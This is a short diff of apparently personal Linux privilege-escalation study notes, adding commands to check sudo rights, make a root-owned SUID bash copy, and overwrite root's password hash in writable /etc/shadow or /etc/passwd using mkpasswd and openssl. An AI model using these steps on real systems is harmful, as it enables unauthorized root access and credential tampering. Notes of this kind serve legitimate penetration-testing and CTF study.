@@ -7,12 +7,14 @@ what can we run with sudo?			  sudo -l
 Create a copy of /bin/bash or /bin/sh can you call it rootbash - make sure its owned by the root user. Then use /bin/bash -p to run it
 
 				Writable /etc/shadow
-ls -l /etc/shadow					is /etc/shadow writable
+ls -l /etc/shadow					is /etc/shadow writable?
 mkpasswd -m sha-512 password		Makes password Hash
 -- replace root password hash with the one you just generated
 su root								switch to user
 
-			 	Writable /etc/pas
+			 	Writable /etc/passwd
+ls -l /etc/passwd					is /etc/passwd writeable?
+openssl passwd password			     
 
 				Docker
 -- get image name using 'docker ps'
